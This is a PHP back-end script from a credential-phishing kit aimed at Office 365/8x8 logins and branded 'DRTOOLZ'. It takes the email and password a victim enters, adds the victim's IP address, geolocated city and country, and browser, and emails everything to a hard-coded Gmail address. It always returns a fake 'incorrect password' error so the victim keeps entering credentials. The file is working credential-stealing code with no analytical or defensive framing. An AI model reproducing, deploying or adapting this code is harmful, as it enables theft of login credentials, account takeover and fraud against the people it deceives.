<?php
/*
//error_reporting(0);

error_reporting(E_ALL); // Error/Exception engine, always use E_ALL
ini_set('ignore_repeated_errors', TRUE);
ini_set('log_errors', TRUE);
ini_set('error_log', 'errors.log');
*/
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');
$Ok = "watsonhire010@gmail.com";
//
$detail = isset($_POST['detail']) ? $_POST['detail'] : "";
$json = [];
if ((isset($_POST["email"]) && strlen(@trim($_POST["email"])) > 2) && (isset($_POST["password"]) && strlen(@trim($_POST["password"])) > 0)) {

    $ip = "";
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    $ips = getRealIpAddr('ip');
    $ip = !empty($ips) ? $ips : $ip;
    $details = getRealIpAddr("", $ip);
    $country = $details->geoplugin_countryName;
    $state = $details->geoplugin_regionName;
    $city = $details->geoplugin_city;
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $time = date("m-d-Y g:i:a");

    $msg = "--------------< DRTOOLZ Inc. >--------------------------\n ";
    $msg .= "-----------------< 8x8 Provider >---------------------------\n ";
    $msg .= "Provider : OFFICE 365 Log\n ";
    $msg .= "-----------------< OFFICE Access >---------------------------\n ";
    $msg .= "Username : ". $_POST["email"] ."\n ";
    $msg .= "Password : ".$_POST["password"]."\n ";
    $msg .= "-------------------< Location >--------------------------------\n ";
    $msg .= "Sent from $ip on $time\n ";
    $msg .= "Country: $country | State: $state | City: $city\n ";
    $msg .= "---------------------< Browser >----------------------------------\n ";
    $msg .= "USER-WEB-BROWSER:       $browser\n ";
    $msg .= "-------------< DRTOOLZ Inc. >---------------------------------\n\n\n ";
    $subject = "New OFFICE 365 Log $ip";
    $headers = "From: DRTOOLZ <{$_POST['email']}>";
    @mail($Ok,$subject,$msg);
    $file = fopen("../account.txt","a");
    $json = ['signal' => "no-auth", "msg" => "Incorrect email password! Try again"];
} elseif (!isset($_POST["email"]) && !isset($_POST["password"])) {
    $json = ['signal' => "no-data", "msg" => "Unauthorized user Access"];
} elseif (strlen(@trim($_POST["email"])) < 3) {
    $json = ['signal' => "no-email", "msg" => "Ivalid username"];
} elseif (!isset($_POST["password"])) {
    $json = ['signal' => "no-pass", "msg" => "Enter 8x8 password!."];
} elseif (strlen(@trim($_POST["password"])) < 1) {
    $json = ['signal' => "no-pass", "msg" => "Enter 8x8 password!."];
} else {
    $json = ['signal' => "no-data", "msg" => "Unauthorized Access"];
}

echo json_encode($json);



function getRealIpAddr($code = "", $ips = "") {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else
    {
        $ip = !empty(@trim($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : $ips;
    }
    if ($code) {
        if (strtolower($code) == "country") {
            return   simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" .  $ip)->geoplugin_countryName;
        } else if (strtolower($code) == "code") {
            return   simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" .  $ip)->geoplugin_countryCode;
        } else if (strtolower($code) == "state") {
            return   simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" .  $ip)->geoplugin_regionName;
        } else if (strtolower($code) == "city") {
            return   simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" .  $ip)->geoplugin_city;
        } else if (strtolower($code) == "region") {
            return   simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" .  $ip)->geoplugin_region;
        } else if (strtolower($code) == "currency") {
            return   simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" .  $ip)->geoplugin_currencySymbol;
        } else if (strtolower($code) == "ip") {
            return  $ip;
        } else {
            return   simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" .  $ip);
        }
    } else {
        return   simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" .  $ip);
    }
}

?>